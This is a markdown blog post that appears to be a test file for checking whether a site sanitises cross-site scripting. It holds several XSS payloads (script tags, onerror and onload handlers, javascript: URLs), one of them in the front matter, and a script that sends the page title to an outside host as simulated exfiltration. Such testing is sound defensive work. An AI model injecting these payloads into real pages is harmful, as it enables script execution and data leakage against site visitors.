---
layout: post
title: "XSS Test Post"
date: 2026-03-15
tags: [test, security]
category: <img src=x onerror="alert('XSS via category')">
excerpt: "Test post for XSS verification"
---

## Test 1 — Script tag in content

<script>alert('XSS via script tag in content')</script>

Normal paragraph after script tag.

---

## Test 2 — img onerror in content

<img src=x onerror="alert('XSS via img onerror')">

Normal paragraph after img tag.

---

## Test 3 — SVG onload

<svg onload="alert('XSS via SVG onload')"></svg>

Normal paragraph after SVG.

---

## Test 4 — iframe injection

<iframe src="javascript:alert('XSS via iframe')"></iframe>

Normal paragraph after iframe.

---

## Test 5 — Simulated data exfiltration (safe internal target)

<script>
fetch('https://z5.zakipointhealth.com/?xss-test=simulated&page=' + encodeURIComponent(document.title))
  .then(function(r){ console.log('XSS Test 5 FIRED — fetch reached z5.zakipointhealth.com status=' + r.status); })
  .catch(function(e){ console.log('XSS Test 5 BLOCKED — ' + e.message); });
</script>

Normal paragraph.

---

## Test 6 — Simulated redirect (logs only, no actual redirect)

<script>
console.log('XSS Test 6: redirect simulation to z5.zakipointhealth.com');
console.log('XSS Test 6: current page = ' + window.location.href);
// Actual redirect commented out — safe test only:
// window.location = 'https://z5.zakipointhealth.com'
</script>

---

## Test 7 — Markdown link injection

[Click me](javascript:alert('XSS via markdown link'))

---

## Test 8 — HTML entity bypass attempt

&lt;script&gt;alert('this should show as text not execute')&lt;/script&gt;

---

just for test
